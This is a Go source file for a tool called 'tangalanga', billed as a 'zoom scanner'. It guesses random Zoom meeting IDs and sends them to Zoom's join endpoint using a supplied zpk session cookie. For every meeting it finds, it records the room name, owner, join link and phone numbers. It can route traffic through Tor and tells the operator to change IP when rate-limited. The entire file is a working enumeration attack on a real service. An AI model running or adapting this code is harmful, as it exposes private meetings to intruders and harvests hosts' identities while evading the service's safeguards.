// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/logrusorgru/aurora"

	pb "github.com/elcuervo/tangalanga/proto"
	"github.com/golang/protobuf/proto"

	"github.com/cretz/bine/tor"
	"github.com/ipsn/go-libtor"
	log "github.com/sirupsen/logrus"
)

const logo = `

		     zoom scanner

▄▄▄▄▄ ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄· ▄▄▌   ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄·
•██  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█ ██•  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█
 ▐█.▪▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█ ██▪  ▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█
 ▐█▌·▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▌▐▌▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌
 ▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀ .▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀

		made with 💀 by @cuerbot

`

const zoomUrl = "https://www3.zoom.us/conf/j"

var colorFlag = flag.Bool("colors", true, "enable or disable colors")
var token = flag.String("token", "", "zpk token to use")
var debug = flag.Bool("debug", false, "show error messages")
var output = flag.String("output", "", "output file for successful finds")
var useTor = flag.Bool("tor", false, "connect via tor")

var color aurora.Aurora
var tangalanga *Tangalanga

func init() {
	rand.Seed(time.Now().UnixNano())
	color = aurora.NewAurora(*colorFlag)
	flag.Parse()

	fmt.Println(color.Green(logo))

	if *token == "" {
		log.Panic("Missing token")
	}

	if *output != "" {
		file, err := os.OpenFile(*output, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)

		if err != nil {
			log.SetOutput(os.Stdout)
		} else {
			fmt.Printf("output is %s\n", color.Yellow(*output))
			log.SetOutput(file)
		}
	}
}

func debugReq(req *http.Request) {
	requestDump, err := httputil.DumpRequest(req, true)
	if err != nil {
		fmt.Println(err)
	}

	log.Println(string(requestDump))
}

func randomMeetingId() int {
	min := 60000000000 // Just to avoid a sea of non existent ids
	max := 99999999999

	return rand.Intn(max-min+1) + min
}

type Tangalanga struct {
	client       *http.Client
	tor          *tor.Tor
	ErrorCounter int
}

func (t *Tangalanga) FindMeeting(id int) (*pb.Meeting, error) {
	meetId := strconv.Itoa(id)
	p := url.Values{"cv": {"5.0.25694.0524"}, "mn": {meetId}, "uname": {"tangalanga"}}

	req, _ := http.NewRequest("POST", zoomUrl, strings.NewReader(p.Encode()))
	cookie := fmt.Sprintf("zpk=%s", *token)

	req.Header.Add("Cookie", cookie)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, _ := t.client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)

	m := &pb.Meeting{}
	err := proto.Unmarshal(body, m)
	if err != nil {
		log.Panic("err: ", err)
	}

	missing := m.GetError() != 0

	if missing {
		info := m.GetInformation()

		if m.GetError() == 124 {
			log.Panic(info)
		}

		// Not found
		if info == "Meeting not existed." {
			t.ErrorCounter++
		} else {
			t.ErrorCounter = 0
		}

		return nil, fmt.Errorf("%s", color.Red(info))
	}

	return m, nil
}

func (t *Tangalanga) torDialer() (*tor.Dialer, error) {
	tor, err := tor.Start(nil, &tor.StartConf{ProcessCreator: libtor.Creator})

	if err != nil {
		fmt.Errorf("Unable to start Tor: %v", err)
	}

	t.tor = tor

	dialCtx, _ := context.WithTimeout(context.Background(), 3*time.Minute)

	return tor.Dialer(dialCtx, nil)
}

func (t *Tangalanga) Close() {
	defer t.tor.Close()
}

func (t *Tangalanga) NewHTTPClient() {
	t.client = &http.Client{}
}

func (t *Tangalanga) NewHTTPTORClient() {
	fmt.Printf("connecting to the TOR network... %s\n", color.Yellow("please wait"))
	dialer, err := t.torDialer()

	if err != nil {
		fmt.Errorf("Unable to start Tor: %v", err)
	}

	fmt.Printf("connection via TOR %s\n", color.Green("successful!"))
	t.client = &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
}

func NewTangalanga() *Tangalanga {
	t := new(Tangalanga)
	t.ErrorCounter = 0

	if *useTor {
		t.NewHTTPTORClient()
	} else {
		t.NewHTTPClient()
	}

	return t
}

func main() {
	tangalanga = NewTangalanga()
	c := make(chan os.Signal, 2)

	go func() {
		<-c
		tangalanga.Close()
		os.Exit(0)
	}()

	fmt.Printf("finding disclosed room ids... %s\n", color.Yellow("please wait"))
	for i := 0; ; i++ {
		if i%200 == 0 && i > 0 {
			fmt.Printf("%d ids processed\n", color.Red(i)) // Just to show something if no debug
		}

		id := randomMeetingId()

		m, err := tangalanga.FindMeeting(id)

		if err != nil && *debug {
			fmt.Printf("%s\n", err)
		}

		if tangalanga.ErrorCounter >= 100 {
			fmt.Println(color.Red("Too many errors, change ip"))
		}

		if err == nil {
			r := m.GetRoom()
			roomId, roomName, user, link := r.GetRoomId(), r.GetRoomName(), r.GetUser(), r.GetLink()

			msg := "\nRoom ID: %d.\n" +
				"Room: %s.\n" +
				"Owner: %s.\n" +
				"Link: %s\n\n"

			fmt.Printf(msg,
				color.Green(roomId),
				color.Green(roomName),
				color.Green(user),
				color.Yellow(link),
			)

			log.WithFields(log.Fields{
				"room_id":   roomId,
				"room_name": roomName,
				"owner":     user,
				"link":      link,
			}).Info(r.GetPhoneNumbers())
		}

	}
}
